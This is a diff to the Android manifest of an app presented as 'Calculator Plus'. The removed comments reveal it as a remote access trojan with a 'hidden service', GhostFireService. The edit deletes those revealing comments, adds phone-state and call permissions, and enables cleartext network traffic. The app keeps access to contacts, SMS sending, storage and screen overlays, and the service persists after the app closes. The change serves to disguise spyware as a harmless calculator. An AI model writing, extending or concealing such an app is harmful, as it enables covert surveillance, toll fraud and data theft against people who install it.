@@ -2,7 +2,6 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.calc.plus">
 
-    <!-- Permissions for RAT functionality -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.READ_CONTACTS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
@@ -12,15 +11,16 @@
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
 
     <application
         android:allowBackup="true"
         android:icon="@drawable/ic_calculator"
         android:label="Calculator Plus"
-        android:theme="@style/Theme.AppCompat.Light">
+        android:theme="@style/Theme.AppCompat.Light"
+        android:usesCleartextTraffic="true">
 
-        <!-- Launcher activity: calculator -->
         <activity android:name=".MainActivity"
             android:exported="true">
             <intent-filter>
@@ -29,7 +29,6 @@
             </intent-filter>
         </activity>
 
-        <!-- Hidden service -->
         <service android:name=".GhostFireService"
             android:exported="false"
             android:stopWithTask="false" />
